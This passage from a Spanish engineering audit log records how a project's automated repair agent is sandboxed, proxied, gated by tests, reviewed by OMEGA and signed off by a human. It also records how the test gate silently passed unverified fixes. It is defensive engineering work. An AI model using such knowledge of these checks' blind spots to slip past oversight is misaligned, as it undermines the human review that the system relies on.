- **`DATA-MODEL.md`** da la identidad del hallazgo con la fórmula de ADR-067 en
  tres sitios, y `loop_sessions` y `self_observations` sin las columnas que sí
  existen, entre ellas el `status` sobre el que se apoya toda la dedup.
- **`FLOWS/GRAPH-REINDEX.md`** no conoce dos ramas vivas de la decisión de
  reindexar y contradice la tercera. **`FLOWS/LOOP-VIEJO.md`** lleva un
  vocabulario de paradas y fases de otra versión y niega una garantía que el
  código ya no da. **`FLOWS/CHAT.md`** describe un prompt que solo existe en la
  ruta de la API. **`PAGES/conectores.md`** llama conector al grafo, que no lo
  es y no se puede apagar.

### 9.6 P3 — Código sin consumidor, y controles duplicados

**Cuarenta exportaciones ejecutables de `src/domain` sin un solo importador en
`src/`, tests incluidos.** Medido con barrido por nombre. Cinco importan porque
prometen algo que no ocurre:

- `PERMISSION_SUMMARY`: «lo que se le explica al operador sobre lo que el agente
  puede hacer». Nadie la pinta, así que el operador no ve en ninguna pantalla que
  en supervisado el agente ejecuta comandos.
- `SELF_REPO_EXIGE_FIRMA`: «se asienta y viaja: no es un silencio». No se asienta
  en ningún sitio, así que la no-integración en el repo propio es un silencio.
- `INSTALL_HINT`: propone `npx -y codebase-memory-mcp`, que el propio repo tiene
  medido como fallo de handshake y que el modelo de seguridad prohíbe por no
  fijar versión.
- `analyzeReflection`: la familia `recon` del análisis de superficie no está
  cableada, así que el nivel `ultra` produce exactamente lo mismo que `alta`.
- `objecionesComoPedido`: el bucle de objeciones del tribunal, ADR-096 Fase B,
  escrito, con test, y sin cablear; el productor nunca ve las objeciones.

**Controles de seguridad duplicados en cinco sitios**, que es el patrón que el
saneador compartido se extrajo para cerrar: `safe()` tres veces, `parseAmount`
tres veces con el mismo techo y distinto fallback, dos tablas de palabras clave,
dos listas de timeouts y dos `fuera()` con distinta dureza, donde la que juzga el
diff es la floja.

### 9.7 Lo que la auditoría comprobó que está BIEN

Para que la lista de arriba no se lea como un panorama: cero violaciones de capa
en los 446 ficheros de dominio; dos marcadores de tarea pendiente en todo `src`;
la tabla de severidad, el score y las bandas de OMEGA cuadran línea a línea con
su documentación; los vocabularios cerrados tienen su guard y su cajón declarado;
el JSON de `--mcp-config` no es inyectable por la ruta del proyecto y viaja como
un solo argumento, sin shell en ningún camino; el muro del grafo aislado aguanta
al `.mcp.json` del proyecto; la tabla de registros del proxy es cerrada de verdad
y casa hosts enteros; los flags de la caja no abren red; el fail-closed está en
las dos clases; la contención de la raíz del proyecto rechaza `..` por segmentos
en las tres puertas; la clave cifrada no cruza el puente en ninguno de los dos
sentidos; y el ReDoS del PEM que se cerró ayer está probado con carga real.

### 9.8 PENDIENTE: los tramos 2 a 7 de la auditoría

Esta auditoría cubrió **`src/domain` entero más un barrido mecánico del repo**.
Falta la profundidad por capa, en este orden y por esta razón:

| Tramo | Alcance | Por qué ahí |
|---|---|---|
| 2 | Infraestructura del motor y del escáner | es lo que spawnea agentes y toca el disco |
| 3 | Resto de infraestructura: grafo, caja, persistencia, IPC | la frontera con el sistema |
| 4 | `src/application`, 195 ficheros | orquesta las reglas ya auditadas |
| 5 | Puente y presentación, 430 ficheros | cobertura baja: 74 tests para 410 fuente |
| 6 | `scripts/`, 106 ficheros | cero tests, y corren sobre la base viva |
| 7 | Barrido documental completo | cerrar las erratas de §9.5 con método |

## 10. Lo que la cura del perímetro dejó desalineado (2026-09-30)

### 10.1 ~~P2 — Seis documentos describen el LOOP como si existiera~~ — CERRADA 2026-10-04

**Barrido hecho el 2026-10-04**, fichero por fichero y con las tres categorías
que esta deuda pedía: FUNCIONAMIENTO-ACTUAL (§2.3 retirada, §5.2 y §5.4
reescritas sobre ADR-107, debut y selección al día), IPC.md (los tres canales
y el interruptor marcados RETIRADOS), DATA-MODEL (tabla y columna históricas,
sin escritor), GLOSSARY (`debut` con la escalera, `loopBlocked` histórico),
OVERVIEW (el renglón del loop ahora cuenta el Motor con drenaje) y PRINCIPLES
(el ejemplo en pasado). HISTORY y CHANGELOG lo siguen nombrando, como debía.

ADR-107 (`d5e9945`) retiró el LOOP de raíz. La documentación que cuenta **cómo
funciona hoy** no se ha tocado, así que describe un subsistema que ya no está.
Medido por `grep -ci loop` sobre cada fichero, el mismo día del merge:

| Documento | Líneas con «loop» | Lo peor que afirma |
|---|---|---|
| `docs/FORTRESS-FUNCIONAMIENTO-ACTUAL.md` | 27 | es el documento del presente |
| `docs/IPC.md` | 9 | tabula `loop:last-session`, `loop:status` y `loop:chunk`, tres canales que ya no se registran |
| `docs/DATA-MODEL.md` | 8 | — |
| `docs/GLOSSARY.md` | 6 | define el término como vivo |
| `docs/OVERVIEW.md` | 5 | — |
| `docs/PRINCIPLES.md` | 3 | — |

`docs/FLOWS/LOOP-VIEJO.md` (26) ya se llamaba «viejo» y queda como historia;
`docs/HISTORY.md` y `docs/CHANGELOG.md` **deben** seguir nombrándolo, porque
cuentan lo que pasó.

**Por qué P2 y no P1:** ninguna de estas líneas gobierna código ni engaña a un
agente en ejecución —el bloque de barreras y los prompts no las leen—, pero sí
engañan a quien lea la documentación para decidir. Es exactamente la regla de
«dónde vive cada verdad» del `CLAUDE.md` incumplida por un día.

**Arreglo:** un barrido documental corto, fichero por fichero, distinguiendo las
tres categorías —**retirar** (lo que describe el presente), **conservar** (lo
histórico) y **reescribir** (lo que ahora hace el Drenaje en su lugar)—. Es el
mismo trabajo que el tramo 7 de §9.8 ya tiene planificado, y cabe dentro de él.

### 10.2 CERRADA — La asimetría de los dos nacimientos

**~~`planRepair` devolvía `null` sin motivo y `retryRepair` sí lo devolvía.~~** —
**ARREGLADA el 2026-09-30** (`0cb6eda`, dentro del merge `4e82c0f`). Los cuatro
finales sin propuesta del plan se contaban como uno, así que un proyecto negado
por el perímetro de ADR-107 le llegaba al operador como «no queda nada elegible»:
una frase falsa sobre un bloqueo deliberado. Ahora el motivo viaja **tipado**
(`PlanResult` → `ChainOutcome.negado` → `FinDelDrenaje.negado` → el aviso de la
UI). Cinco mutantes, uno por eslabón.

**Lo que NO hace, y es deliberado:** el motivo **no se persiste**. No hay
propuesta a la que colgar un evento, y asentarlo como observación llevaría el
nombre del proyecto del CLIENTE al export de auto-mejora, contra el cerco de
ADR-085. Queda igualado con `retryRepair`, que tampoco lo persiste.

**Lo que destapó, y vale más que el arreglo:** desde la cura, **tres checks de
integración pasaban por la razón equivocada**. `repair-checks.cjs` decía probar
«sin hallazgos ACTIVE» y «sin repo git», y `mitigate-checks.cjs` «no lo puede
elegir ni dirigido»; los tres usan proyectos en `/tmp`, así que el perímetro los
negaba **antes** de llegar a lo que decían medir. Con el motivo en `null` los tres
seguían en verde y nadie podía verlo. Reescritos para decir lo que prueban
(`cebaa30`); los dos casos que decían cubrir viven donde sí se ejercitan, en
`plan-repair.test.ts`.

**La lección, para el barrido del tramo 7:** *retirar una capa no rompe los tests
que la cruzaban — los deja pasando por otra razón.* Vale la pena buscar más casos
de este patrón entre los checks de integración que tocan el Motor.

### 10.3 P3 — `innegociables-defensa.ts` en 75/75 líneas

Con las dos familias nuevas —perímetro (ADR-107) y selección (ADR-106)— el
fichero queda **exactamente en el límite**. La siguiente familia no cabe. El
`CLAUDE.md` ya dice qué hacer: **partir por familia, nunca subir el límite**. Se
anota para que quien llegue con la tercera no descubra el techo a mitad del arco.

## 11. El gate del Motor no pasa en la caja (medido 2026-09-30)

### 11.1 ~~P0 FUNCIONAL — `npm ci` del gate no ha pasado NUNCA dentro de la caja~~

**CERRADA el 2026-09-30 (ADR-108, merge `39e919e`) Y VERIFICADA EN VIVO.** Tres
artefactos públicos en la caja clase B, `--ro-bind`, padres y nunca por versión:
`~/.electron-gyp`, `~/.cache/node-gyp` y `~/.cache/electron`. **Eran DOS fallos**,
y el segundo solo apareció al probar el `npm ci` COMPLETO: con solo las cabeceras
moría en `getaddrinfo ENOTFOUND github.com`, porque el paquete `electron` baja su
**binario** de ahí. Con los tres: **`npm ci` completo rc=0 en 65 s** con los args
REALES de `enCaja`, un solo host en el proxy, sin red, y el aislamiento intacto
(`/media` 0, `~/.ssh` y `~/.config` inexistentes, EROFS al escribir). 5 mutantes.
**Pendiente la corrida real del gate** en producción (ADR-108 §5). La medida
original, para la historia:


**Medido sobre `proposal_events`, partido por la fecha de ADR-092 (21-sep):**

| Proyecto | Antes de la caja | Después |
|---|---|---|
| `fortress-command-center` | **52 OK** | **3 FALLO** |
| `mailbd-main` | **47 OK** | — |

**99 de 99 verdes antes. 0 de 3 después.** El último verde es del **19-sep**; la
caja entró el **21-sep**; las tres primeras corridas posteriores son las del
**30-sep 21:26, 21:29 y 21:32**, y las tres murieron en `node-gyp`. Solo una de
las tres tocaba `package.json`: las otras dos eran fixes sin relación alguna.

**La cadena, trazada:** `npm ci` dispara el `postinstall` del repo
(`electron-builder install-app-deps`), que recompila los nativos contra el ABI de
Electron; `node-gyp configure` busca las cabeceras en su `devdir`; la caja **tapa
el HOME con un tmpfs**, así que no ve `~/.electron-gyp/39.8.10` ni
`~/.cache/node-gyp/24.18.0` —que SÍ están en la máquina, 125 y 2727 ficheros—; y
sale a descargarlas. El proxy abre **un solo host** para Node.js
(`registry.npmjs.org`), no el de cabeceras, y contesta `NEGADO`. Lo que llega al
operador es `gyp ERR! Request was cancelled`, a ocho capas de la causa.

**Reproducido con un `bwrap` real** el 30-sep: con la forma de la caja de hoy,
`node-gyp configure` falla con el MISMO stack que el gate
(`async install ← getNodeDir`).

**CHOCA CON ADR-107.** La cura dejó al Motor **solo** sobre FORTRESS, que es
precisamente el proyecto cuyo gate la caja no deja pasar. Las dos decisiones se
cruzaron por primera vez la noche del 30-sep.

**El arreglo está MEDIDO y espera firma** (toca el perímetro del sandbox): ver el
informe del 30-sep. En corto: montar las dos cachés de cabeceras en
**`--ro-bind`** (el mecanismo ya existe, `Caja.soloLectura`) hace que
`node-gyp configure` termine en `gyp info ok` **sin red** —probado—; pero NO
alcanza para un fix que suba el major de Electron, porque la versión destino no
está en la caché del HOST y el devnode en solo lectura falla antes de descargar
(`ENOENT: mkdir '/home/jojo/.electron-gyp/40.0.0'`, probado).

### 11.2 P2 — El proxy de registros niega en SILENCIO

`proxy-de-registros.ts:51` responde `cliente.end(NEGADO)` y **no registra nada**:
ni el host pedido, ni la propuesta, ni el momento. Un host fuera de la tabla
cierra la conexión sin traza, y el síntoma aparece en el error de la herramienta
que lo pidió, no donde se decidió. Diagnosticar §11.1 exigió bajar a la base y
leer un stack de `undici`. **Arreglo:** apuntar el host denegado donde ya se
apunta el resto de la corrida.

### 11.3 P2 — `intentosPrevios` se cuenta a sí misma

`planRepair` inserta la propuesta y **después** llama a `estudiar`, que lista las
propuestas del hallazgo (`estudiar-con-memoria.ts:31`). En un primer intento
`suyas.length === 1` —su propia fila— y el analista recibe «*Este hallazgo ya
tuvo 1 propuesta(s) de reparación; ninguno llegó a integrarse*». **Medido:** sobre
el hallazgo del Electron existe **una** propuesta, y es la que se estaba
analizando. Le fabrica un historial de fracasos que no hubo. Misma familia que el
arco del prompt que miente al agente. **Arreglo:** excluir la propuesta en curso.

### 11.4 ~~P1 — La cobertura del gate en la caja nunca se midió~~

**CERRADA el 2026-09-30: ahora está medida** (ADR-108). Lo que faltaba no era la
red: era **el gate entero dentro de la caja** sobre un repo con dependencias
nativas. Medido de punta a punta con `bwrap` real y el proxy real, y lo que se
midió es exactamente lo que el gate corre. La medida original:


El docblock de `registros-de-paquetes.ts` es honesto sobre su límite: «MEDIDO, y
hasta donde: npm, de punta a punta —**`npm view`** real a través del proxy, el
2026-09-21—». Se midió `npm view`. **Nadie midió un `npm ci` con recompilación
nativa**, que es lo que el gate corre en cada vuelta, y el primer proyecto en
tropezar fue el propio. La casilla que faltaba no era la red: era **el gate
entero dentro de la caja**, sobre un repo con dependencias nativas.

### 11.5 ~~P0 FUNCIONAL — el gate del Motor no probaba el extractor en worktree~~

**CERRADA el 2026-09-30, y la destapó ADR-108.** Al arreglar el `npm ci` el gate
llegó por fin a `test:unit`… y estaba rojo. **Era una ceguera MÁS VIEJA, y la
nueva la tapaba:**

| Ceguera | Desde | Por qué |
|---|---|---|
| `test:unit` rojo en todo worktree | **10-sep** | 5 ficheros leían `internal/AUDIT-KIT/`, que está en `.gitignore` y **no viaja a un worktree** |
| `npm ci` rojo en la caja | 21-sep | ADR-108, cerrada |

Medido en `proposal_events`: **último `test:unit` verde del gate el 04-sep** —seis
días ANTES de que naciera el fixture—, y **trece rojos** después (11 el 14-sep, 2
el 19-sep). Desde el 21-sep el gate moría antes, en `npm ci`, así que nadie vio
que `test:unit` llevaba once días muerto. **El gate del Motor no dio un veredicto
útil sobre FORTRESS durante 26 días.**

**La ceguera era SOLO del Motor:** en el repo real los cinco ficheros pasan (55
tests), porque `internal/` existe ahí. El `npm run test:unit` del operador nunca
lo vio.

**Lo medido antes de elegir.** Las tres vías, y por qué se descartaron dos:

- **El kit a git** — *descartada.* Las 17 plantillas son **publicables** (0
  rastros de cliente, operador o secretos; los tres `sk-`/`token`/`password` son
  patrones de búsqueda DENTRO de los prompts). Pero **son el producto**, y
  `.gitignore` las excluye a propósito. El coste no era privacidad: era regalar
  el contenido.
- **Saltar los cinco** — *descartada, y es la peor.* Medido: sin el kit **no
  sobrevive NI UN test del extractor** (`cuerpoAccionable`, `resumenDeModulo`,
  `sustituirHuecos` y `bloqueDePlantillas` solo los cubren esos cinco). Un fix
  que rompiera el extractor saldría **verde**, y el extractor roto devuelve
  `null`: silencio sin bloque. Es instalar la misma ceguera a propósito.
- **Vía 3** — *elegida.* Los cinco tests **eran dos clases distintas**.

**Lo construido.** Cuatro tests prueban el CÓDIGO → leen una **plantilla
sintética** versionada (`plantilla-sintetica.ts`), escrita PARA el test, con las
cuatro anclas del contrato y marcas que podar. **No es un recorte** de una real:
eso sería producto en git y envejecería sin avisar. Un test prueba LOS DOCUMENTOS
(`plantilla-contrato`) → sigue leyendo `internal/` y **se salta diciéndolo**
donde el kit no está.

**La línea que lo separa de la vía 2**, y tiene su propio guardián
(`contrato-del-kit.test.ts`): **falla** si el kit está y alguno no encaja,
**salta** si el kit no está, **nunca pasa en silencio por ausencia**. El guardián
juzga el código del test —`skipIf` atado a `kitDisponible`, la razón impresa,
ningún `return` de escape dentro de un `it`—, igual que `clase-b-en-caja`.

**Verificado en un worktree real** (`git worktree add` desde la rama, sin
`internal/`): **865 ficheros verdes, 1 saltado; 4595 tests verdes, 1 saltado,
cero rojos.** Y el salto se LEE: `[plantilla-contrato] SALTADO — kit ausente
(internal/AUDIT-KIT no viaja a un worktree): no hay plantillas que medir aqui`.

**Dos datos falsos que caí al medir, y quedan corregidos en el código:** el
extractor tiene **TRES** ramas `null`, no cuatro —la falta de `═══ FIN ═══` no
devuelve `null`, se queda con todo—; y el contrato exigía «del paso A al I»,
**falso en nueve de las doce**: los cuerpos van de **seis** pasos (M1, M4, M7) a
nueve (M5, M8, M12). Ahora exige lo que sí es el contrato: una **tira seguida
desde A**, porque un hueco en medio significa que el extractor cortó por donde no
debía.

### 11.6 ~~P1 — El gate ABSUELVE en silencio lo que hereda, y nadie lee el acta~~

**CERRADA el 2026-09-30: firmada en ADR-109, construida en el merge `b1645b9`.**
La medida que la abrio queda abajo, entera.

**Medido el 2026-09-30 al cerrar §11.5, y es el hallazgo de raiz de toda la
investigacion.** `gate-sequence.ts` hace algo deliberado y bien razonado: si un
comando del gate falla, vuelve a `baseSha`, lo corre ahi, y si **ya estaba rojo
en la base** y el fix no anade ruido en sus propios ficheros, no se lo achaca al
fix. Si TODO lo que fallo era heredado, **el gate pasa**. La razon esta escrita:
«exigirle a un fix que deje verde un arbol que ya estaba rojo antes de tocarlo es
pedirle que arregle el proyecto entero para arreglar una linea».

**El efecto, desde el 10-sep:** `test:unit` estaba rojo en la base de todo
worktree (§11.5), se heredaba siempre, y el gate pasaba con su comprobacion de
tests **estructuralmente apagada**.

| Medida sobre FORTRESS | |
|---|---|
| gates verdes | **44** |
| de ellos con algo heredado | **12 — los doce `test:unit`** (1 el 21-ago, 9 el 14-sep, 2 el 19-sep) |
| fixes que llegaron a MERGEADO asi | **8** (7 firmados por el operador el 14-sep) |
| rechazos de FORTRESS | 11 — **7 legitimos** (4 lint, 3 typecheck, todos ANTES del 10-sep) |
| rechazados por `gate_failed_at=test:unit` | **1** |

**El gate NUNCA mintio: lo anoto en el libro doce veces** (`heredado:
["test:unit"]`, desde el 21-ago). **Nadie lo leyo.** No era un juez ciego que
condenaba; era un juez al que le habian quitado una prueba y lo decia en el acta.

**Es el bug OPUESTO al que se supuso**, y peor de ver: no rechazaba de mas
—absolvia de mas—, y lo de mas se ve (`RECHAZADO`) mientras lo de menos no
(`VERDE` con una prueba apagada).

**EL ARREGLO DE RAIZ, a la firma del operador:** que el `heredado` **llegue al
operador** —a OMEGA, a la firma, al parte— en vez de quedarse en el libro. Un
verde-con-heredado se firmaria SABIENDOLO. Es el mismo principio que la via 3 y
que el contrato del kit: **lo no verificado se declara donde se lee, no se
entierra.** Donde inyectarlo esta sin medir: `ChainOutcome` -> el parte -> la
firma.

**DATO AMPLIADO (2026-09-30, al verificar el arreglo contra el libro).** Los doce
de la tabla eran **solo FORTRESS**. En TODA la base son **29**:

| Proyecto | Heredado | Desenlace | |
|---|---|---|---|
| fortress-command-center | `test:unit` | **MERGEADO** | **8** |
| fortress-command-center | `test:unit` | OMEGA | 1 |
| fortress-command-center | `test:unit` | RECHAZADO | 3 |
| **mailbd-main** | `lint` | CADUCADO | **15** |
| mailbd-main | `lint` | RECHAZADO | 2 |

**`mailbd` —un CLIENTE— heredo `lint` diecisiete veces.** La misma absolucion
silenciosa sobre codigo ajeno, de cuando el Motor aun tocaba clientes (antes de
ADR-107). **Lo unico que lo salva es que las quince CADUCARON: ninguna de cliente
llego a integrarse.** El dano quedo en FORTRESS, en los ocho mergeados; el
mecanismo, no.

**Nota:** el diseno de la herencia NO se discute, es correcto. Lo que falta es
que su consecuencia se vea.

### 11.6b ARREGLADO — el gate declara lo que absuelve (merge `b1645b9`)

**El mecanismo de la herencia queda EXACTAMENTE igual**; lo que cambia es que su
consecuencia se lee. `avisoDeHerencia` (dominio) es la unica fuente del texto, y
llega a los tres sitios donde se decide:

| Destino | Antes | Ahora |
|---|---|---|
| **OMEGA** (`elGate`) | `GATE: verde en todos los comandos` — **falso en los 12** | `GATE: verde CON HERENCIA (… NO verificado)` |
| **La firma** (`reason` del evento) | `gate verde`, y la herencia detras de DOS CLICS en JSON crudo | `gate verde — … heredado de la base, NO verificado` |
| **El parte** (`ChainOutcome`) | no llevaba nada | `aprobada (… heredado…), esperando firma humana` |

**El punto de la firma resulto mejor que un cuello unico:** es el `reason` del
evento, que la UI **ya pinta**, asi que el operador lo lee sin un solo cambio de
interfaz y queda escrito en el libro para siempre.

**El caso limpio no paga NADA**, y tiene su test: sin herencia las tres frases
son identicas a las de antes. Seis mutantes muertos, uno por cada parte del
camino —incluido «meter ruido en el caso limpio»—.

**Verificado contra el libro real** (propuesta `6726f1eb`): lo que el operador
leia era `"gate verde"`; lo que leera, `"gate verde — lint heredado de la base,
NO verificado"`.

**FIRMA: ADR-109.** El operador eligio ADR propio sobre esta seccion, con el
criterio de ADR-106: lo que cambia es **la informacion sobre la que se decide**
—OMEGA puede juzgar distinto un verde con herencia—, y en un sistema donde la
firma humana es la ultima red, cambiar lo que el firmante ve es una decision de
arquitectura aunque el mecanismo no se toque. La firma literal vive en
**ADR-109 §1**; la medicion, aqui.

### 11.7 ~~P2 — Dos docblocks mentirosos en el tipo que define el veredicto~~

`src/domain/repair/gate-result.ts:32`, rama `ok: true`:

> «Reservado a (ii-b): hoy un verde no puede traer nada heredado.»

**Falso: ha pasado doce veces** (§11.6). Y la rama `ok: false` del mismo fichero
dice «No cambia el veredicto —rojo es rojo—», que es **lo contrario** de lo que
`gate-sequence.ts` hace con un rojo heredado. Los dos describen un diseno
ANTERIOR al que corre: el codigo evoluciono al anadir la herencia y los docblocks
se quedaron en la version vieja. **En el tipo que define el veredicto del gate**,
que es el peor sitio posible para un comentario que miente.

**ARREGLADOS en el merge `b1645b9`** (decidido en **ADR-109 §4.4**). Las dos
frases viejas **se conservan entre comillas**, no se borran: el fichero dice ahora «El docblock decia «…». Era
FALSO», con el dato de las doce veces. Y su test lo exige asi —que no se
**afirmen**, que aparezcan **citadas** y con su correccion al lado—: borrar una
mentira vieja deja al siguiente sin saber que se creyo, ni por que dejo de
creerse.

### 11.8 PENDIENTE — Los ocho fixes mergeados sin verificar los tests

Main esta verde hoy (**4632 tests**), asi que no quedo nada roto —o se arreglo por
el camino—. Pero **nadie verifico esos ocho entonces**, y la incognita se cierra
barato: correr los tests de hoy contra lo que cada uno toco. A la firma del
operador.

### 11.9 ~~La pieza B del Electron (el ABI, §3.5 de ADR-108)~~ — CERRADA 2026-10-03 por enmienda firmada

**Procedimiento, no codigo** (ADR-108 §6): poblar los directorios PADRE de la
cache del host (cabeceras + zip + SHASUMS de la version destino) fuera de la
caja — los montajes de ADR-108 ya sirven el major porque montan padres, nunca
`<padre>/<version>`. La version se sabe por adelantado (`npm audit
fixAvailable`) o reactiva (el ENOENT la nombra). Con ADR-111 el generador YA
produce el bump (lock-only); el muro era solo del gate, y el gesto lo quita.
Descartados con razon medida el devdir escribible (las sondas de calidad
corren clase B sobre repos de CLIENTE: envenenaria la cache real) y la red
ancha (github.com en la caja). **Balance: FORTRESS tan capaz como `claude -p`
en cualquier severidad** — JS por ADR-111, ABI por ADR-111 + el gesto. De los
15 HIGH del dia: 9 JS puro, 6 ABI de UNA raiz (electron→44.5.1).

## 12. La mitad que el primer fix del Motor dejo abierta (2026-10-01)

### 12.1 P2 — `ensureGraphBinary` verifica la VERSION, no la INTEGRIDAD

**Anotada ANTES de firmar, y a proposito.** El fix del Motor (propuesta
`7998aa13`, hallazgo `fa86739d`) cierra la mitad principal de
`graph-binary.ts:24`: un binario en el PATH ya no vale por existir, su
`--version` tiene que casar con `GRAPH_MCP_VERSION`, y tras instalar se vuelve a
medir y falla con el motivo. **OMEGA lo aprobo con `resuelve_el_hallazgo:
PARCIAL`**, y la mitad que queda se anota aqui porque **firmar MITIGA el hallazgo
entero**: `advance-proposal.ts:72` llama a `markMitigated` al llegar a MERGEADO,
asi que la fila sale de la cola del Motor y lo pendiente dejaria de verse hasta
que otro escaneo lo mirara.

**Lo que sigue abierto, del titulo del hallazgo:**

- la instalacion es `npm install -g`, **sin `--ignore-scripts`**: el postinstall
  del paquete corre con el entorno del operador;
- **sin hash de integridad**: no se comprueba que lo que se instalo sea lo que se
  esperaba.

**Y dos efectos que OMEGA encontro SOLO** —no estaban ni en el hallazgo ni en el
analisis, y por eso valen doble:

- **si la maquina ya tenia OTRA version, ahora se reinstala en global**, cosa que
  antes no pasaba. El fix gana una escritura global que el codigo viejo no hacia;
- **comprobar la version de un ejecutable no prueba su integridad**: uno plantado
  delante en el PATH puede devolver `0.9.0` igual. La verificacion sube el coste
  de la suplantacion, no la cierra.

**Por que se anota y no se arregla ahora:** cerrar la integridad de verdad pide
decidir COMO (un `--ignore-scripts` cambia lo que el paquete puede hacer al
instalarse; un hash exige de donde sale la referencia), y eso es una decision del
operador, no una linea mas en el mismo fix.

**ESTADO AL 2026-10-01, y sigue ABIERTA:** el fix **esta en main** —merge a mano
`e659c14`, despues de que la firma caducara la propuesta por la quinta ceguera
(§14)—, pero el hallazgo `fa86739d` sigue **`open`**: `mitigated_note` y
`mitigated_at` en `null`, `extinguido_por` en `null`, y la propuesta en
`CADUCADO`. La mitigacion cuelga de `to === 'MERGEADO'` en `advance-proposal.ts`
y ese salto no se dio, asi que **un merge a mano trae el codigo y no cierra
nada**. Es la salida buena para esta deuda: firmar la habria mitigado y esta
mitad habria dejado de verse.

**Y un detalle medido que es el patron A en vivo** (§6.5, «la linea que ya no
es»): el ancla del hallazgo es `graph-binary.ts:24`, que antes era el
`execFileSync('npm', ['install', '-g', …])` —justo la mitad pendiente— y hoy es
un `log(`. La linea del `npm install -g` vive ahora en la **29**. El ancla
derivo con el fix, como estaba previsto.

## 13. La firma no podia leer su propio expediente (2026-10-01)

### 13.1 ~~P0 FUNCIONAL — ninguna propuesta del Motor se podia firmar~~

**CERRADA el 2026-10-01**, merge `5a62c8b` en main. `collectPostOmegaState` buscaba `branch` y `baseSha`
cogiendo **el ULTIMO `GENERATE DECISION`**, dando por hecho que seria el del
worktree —el unico asiento que los lleva—. Dos arcos **BUENOS** le pusieron
asientos detras:

| | | |
|---|---|---|
| `e90ed58` | **28-sep** | la correa al libro (`SCOPE`), para que el revisor la lea |
| `3e223d9` | **30-sep** | la huella del trabajo (`HUELLA`), la pieza 1 del Motor |

Desde el 28-sep 22:10 el ultimo era otro, sin `branch` → el expediente salia
`null` y `repair:sign` contestaba **`incomplete-state`**. **Tres dias en que
NINGUNA propuesta del Motor se podia integrar**, y nadie lo vio porque el gate
estaba ciego (§11.1, §11.5) y ninguna llegaba a OMEGA. **La primera que llego lo
destapo**: la `7998aa13`, el primer fix del Motor con el gate reparado.

**La frontera, medida en el libro vivo** (12 propuestas de FORTRESS, lectura
`readonly`): las cuatro del **19-sep** llevan **un solo** `GENERATE DECISION`
—`[WORKTREE_CREATE]`—, y por eso «el ultimo» acertaba en ellas. Las del **30-sep
en adelante** llevan `[WORKTREE_CREATE , HUELLA , SCOPE]`: ahi el fallo muerde.
La primera corrida afectada fue `6f8bbadd` (30-sep 21:26), y la `7998aa13` fue la
primera que llego a OMEGA y lo destapo.

**EL ARREGLO:** `MOTIVO_WORKTREE` en el dominio, **compartido por quien escribe
y quien lee** —el patron que `MOTIVO_CORREA` y `MOTIVO_HUELLA` ya seguian y que a
este asiento le faltaba: era un literal suelto, y se desfaso—. `ultimo()` acepta
un motivo, y el expediente **busca el asiento que ES, no el que cae ultimo**.

**Verificado contra el libro REAL** de la `7998aa13`: `branch`, `baseSha`,
`commitSha`, ficheros (+79/−15), `gate.ok=true`, `omega=APROBADO`,
`defensasQueToca=[]` → **FIRMABLE**. Cuatro mutantes muertos.

**Las otras cinco** con asientos detras murieron RECHAZADAS, y el gather las lee
**bien**: devuelve `null` por la razon correcta —a `33910cce`, `130d9c14` y
`6f8bbadd` les falta el veredicto de OMEGA; a `cec30bc5` (`provider_error`) y
`a3ef0d14` (`no_diff_produced`), el commit, el tamano del diff y los dos
veredictos—. No hay nada que firmar en ninguna. No se revivio ninguna.

**Verificado con el CODIGO REAL sobre el LIBRO REAL**, no con un doble:
`collectPostOmegaState` y `toEvent` del repo, empaquetados aparte y corridos
contra la base viva en `readonly` (el guion vive fuera del repo). De las **doce**
propuestas de FORTRESS, **una sola** devuelve expediente —la `7998aa13`— y las
once restantes `null`. Las cuatro del 19-sep tambien caen a `null`, pero **no por
este fallo**: su `OMEGA TRANSITION` no lleva `verdict`. Dicho de otro modo, el
arreglo no revive nada: solo deja pasar lo que ya estaba completo.

### 13.2 LA LECCION, con su segunda causa

**Un dato nuevo en el libro obliga a mirar QUIEN LO LEE.** Los dos arcos eran
correctos y el asiento que anadieron era util; lo que faltaba era recorrer sus
lectores. El lector que importaba era la firma, que es la accion mas cara del
sistema.

**Y la segunda causa, que explica el silencio: el fixture no se parecia al libro
real.** `cadenaCompleta()` tenia **un solo** `GENERATE DECISION` y **sin
`reason`**. Ningun test podia notar que se cogia «el ultimo» si en el doble no
habia mas que uno, y encima sin motivo que lo distinguiera. **Un doble que no se
parece al original no prueba lo que dice probar.** Arreglado: el asiento del
worktree lleva su motivo en el fixture.

**Y un hueco de aserciones que lo dice todo:** `generate-fix-camino-feliz` ya
comprobaba `MOTIVO_HUELLA` y `MOTIVO_CORREA`… y **no el del worktree**. Los dos
que tenian constante se afirmaban; el que era literal suelto, no. Un mutante que
le quitaba el motivo al ESCRITOR sobrevivia a todas las suites. Cerrado con la
linea que faltaba.

## 14. La QUINTA ceguera: el merge de la firma, con el PATH congelado (2026-10-01)

### 14.1 ~~P0 FUNCIONAL — la firma moria en el ULTIMO paso, y con la etiqueta equivocada~~

**CERRADA el 2026-10-01**, merge `fecdd37` en main. El operador firmo la `7998aa13` y la app contesto
**`merge-failed-target-branch-detached`**. `main` estaba en su rama, limpio, en
`47c6825`: el HEAD **nunca** estuvo suelto.

**LA CAUSA, reproducida.** El `git` del merge corre DENTRO de la caja, y la caja
necesita `node` en el PATH. `git-del-merge.ts:18` componia el entorno en un
**`const` de modulo**:

```ts
const ENV = { ...buildEnv(null), GIT_TERMINAL_PROMPT: '0', ... }
```

Los imports se evaluan **ANTES** del `augmentPath()` de `main/index.ts:30` —en
el bundle, el `const` esta en el byte 483 348 y la llamada en el 612 553—. Asi
que `ENV.PATH` era el PATH crudo de una app abierta con doble clic, **sin nvm y
sin `node`**. Medido con el PATH real del proceso de la app:

| | |
|---|---|
| PATH crudo de la app | `/home/jojo/.local/bin:/usr/local/sbin:…:/snap/bin` — sin `node` |
| con ese PATH | `CAJA ok=false error=sin-caja:falta-node` → `git fallo=true` |
| con el PATH que `augmentPath` completa | `CAJA ok=true` → `git` devuelve `main` |

**ERA UN SOLO PUNTO, y sus tres hermanos ya lo hacian bien.** `spawn-command`,
`repair-git` y `run-command` componen el entorno **en la llamada** y lo dicen en
su docblock —«se compone al lanzar y no al cargar el modulo»—. `git-del-merge`
era el unico que lo congelaba. Por eso el Motor podia hacer TODO desde la app
menos el ultimo paso: crear el worktree, generar, pasar el gate entero y recibir
el veredicto de OMEGA, y morir al integrar.

**POR QUE NADIE LO VIO ANTES:** las corridas del Motor se habian hecho desde un
arnes con el PATH de una shell —con nvm—, no desde el AppImage. **La firma del
operador fue la PRIMERA vez que la caja se levanto desde la app empaquetada.**

**Y LA SEGUNDA MITAD DEL DEFECTO, que es la que cuesta tiempo:** la etiqueta
